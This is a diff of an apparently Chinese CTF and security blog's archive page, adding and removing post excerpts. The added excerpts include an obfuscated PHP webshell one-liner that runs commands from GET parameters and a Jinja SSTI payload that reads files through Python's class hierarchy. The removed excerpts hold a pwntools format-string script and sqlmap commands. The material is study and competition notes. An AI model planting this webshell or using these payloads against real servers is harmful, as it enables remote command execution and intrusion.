@@ -341,6 +341,150 @@
     
     
     <article class="index-post">
+        <a class="abstract-title" href="/posts/5109/">
+            
+                <span>php-命令执行</span>
+        </a>
+        <div class="abstract-content">
+            
+webshell
+
+123456&lt;?=$_="`&#123;&#123;&#123;"^"?&lt;&gt;/";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);=&gt; $_GET[_]($_GET[__]);=&gt;&lt;?=`&#123;$&#123;~"����"&#125;[_]&#125;`;// echo -ne '&lt;?=`&#123;$&#123;~"\xa0\xb8\xba\xab"&#125;[_]&#125;`;'
+
+写文件&amp;读文件
+
+php的标签&lt;?php存在字母肯定不行，尝试&lt;?发现不解析，...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/18</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="web安全">web安全</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/posts/62555/">
+            
+                <span>RSA学习</span>
+        </a>
+        <div class="abstract-content">
+            openssl相关操作提取pubkey.pem相关信息
+1openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem
+解密:
+1openssl rsautl -decrypt -in 【flag.enc】 -inkey 【private.pem】
+已知p,q若已知质数p和q，则通过依次计算欧拉函数值phi、私钥d可解密。在选取加密指数e时要求phi，e互质，也就是gcd(phi,e)==1 ，如果不满足是无法直接解密的。
+123456789def rsa_decrypt(e, c, p, q):    phi = (p - 1)...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/17</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/posts/28940/">
+            
+                <span>ssti</span>
+        </a>
+        <div class="abstract-content">
+            payload大全bypass 各种字符串
+利用request.args
+
+1&#123;&#123;&apos;&apos;[request.args.a][request.args.b][2][request.args.c]()[40](&apos;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&apos;)[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read
+
+利用字符串拼接
+
+12&#123;&#123;requ...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/17</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="python安全">python安全</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/posts/45992/">
+            
+                <span>php命令执行函数</span>
+        </a>
+        <div class="abstract-content">
+            代码或命令执行函数：
+
+system                    允许执行一个外部程序并回显输出，类似于 passthru() 
+shell_exec
+exec                        允许执行一个外部程序 
+curl_exec
+popen               可通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。
+proc_open               执行一个命令并打开文件指针用于读取以及写入 
+passthru                   允许执行一个外部程序并回显输出 
+pcntl_exec...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/15</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="web安全">web安全</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href="/posts/63527/">
             
                 <span>ollyice</span>
@@ -536,155 +680,10 @@ man命令允许执行命令
         </div>
     </article>
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/54865/">
-            
-                <span>python多线程和lock和Rlock</span>
-        </a>
-        <div class="abstract-content">
-            在threading模块中，定义两种类型的琐：threading.Lock和threading.RLock。
-RLock允许在同一线程中被多次acquire。而Lock却不允许这种情况。注意：如果使用RLock，那么acquire和release必须成对出现，即调用了n次acquire，必须调用n次的release才能真正释放所占用的琐。
-rlock只能在同一个线程acquire和release
-lock可以在不同的线程acquire和release
-rlock的作用: 在递归程序中，可能会需要重复的acuqire,release，这时候，就必须要使用rlock。
-
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/06/14</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="python">python</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/54897/">
-            
-                <span>linux格式化字符串漏洞</span>
-        </a>
-        <div class="abstract-content">
-            
- offset.py
-
-12345678910111213from pwn import *context.log_level = &apos;debug&apos;def exec_fmt(payload):    p = process(&quot;./vuln&quot;)    p.sendline(payload)    info = p.recv()    p.close()    return infoautofmt = FmtStr(exec_fmt)print autofmt.offset
-
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/06/08</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/29112/">
-            
-                <span>pwn前置知识</span>
-        </a>
-        <div class="abstract-content">
-            调用约定32位和64位程序的区别, 更多的是体现在调用约定(Calling Convention)上. 因为64位程序有了更多的通用寄存器, 所以通常会使用寄存器来进行函数参数传递 而不是通过栈, 来获得更高的运行速度.
-本文主要是介绍Linux平台下的漏洞利用, 所以就专注于System V AMD64 ABI 的调用约定, 即函数参数从左到右依次用寄存器RDI,RSI,RDX,RCX,R8,R9来进行传递, 如果参数个数多于6个, 再通过栈来进行传递.
-12345678910111213141516171819202122$ cat victim.cint foo(int a, in...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/06/08</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="pwn">pwn</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/5359/">
-            
-                <span>sqlmap使用</span>
-        </a>
-        <div class="abstract-content">
-            sqlmap使用手册sqlmap一共5个级别，级别越高，检测越全面
-
-检测
-默认使用level1，检测全部数据库类型
-
- sqlmap -u “http://www.vuln.cn/post.php?id=1”
-
-
-只检测mysql
-
-sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3
-
-
-检测cookie(（只有level达到2才会检测cookie）)
-
- sqlmap -u “http://www.baidu.com/shownews.asp” –cookie “id=11” –level 2
-
-
-po...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/06/08</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="web安全">web安全</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
     <!-- paginator  -->
     
     <nav class="page-nav">
-        <a class="extend prev" rel="prev" href="/archives/">&#60; PREV</a><a class="page-number" href="/archives/">1</a><span class="page-number current">2</span><a class="page-number" href="/archives/page/3/">3</a><a class="page-number" href="/archives/page/4/">4</a><a class="extend next" rel="next" href="/archives/page/3/">NEXT &#62;</a>
+        <a class="extend prev" rel="prev" href="/archives/">&#60; PREV</a><a class="page-number" href="/archives/">1</a><span class="page-number current">2</span><a class="page-number" href="/archives/page/3/">3</a><a class="page-number" href="/archives/page/4/">4</a><a class="page-number" href="/archives/page/5/">5</a><a class="extend next" rel="next" href="/archives/page/3/">NEXT &#62;</a>
     </nav>
     
 </main>
@@ -1359,9 +1358,101 @@ po...
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 40
+        Total : 44
         </div>
         <!-- search  -->
         
@@ -1374,6 +1465,26 @@ po...
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/05</span><a class="archive-post-title" href="/posts/18428/">lamp && lnmp以apt-get的方式安装</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/04</span><a class="archive-post-title" href="/posts/7418/">WEBSEC-Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/02</span><a class="archive-post-title" href="/posts/42614/">TokyoWesterns CTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href="/posts/12920/">awd准备工作</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1587,6 +1698,8 @@ po...
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
     
         <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
+    
+        <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
     
         <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
     
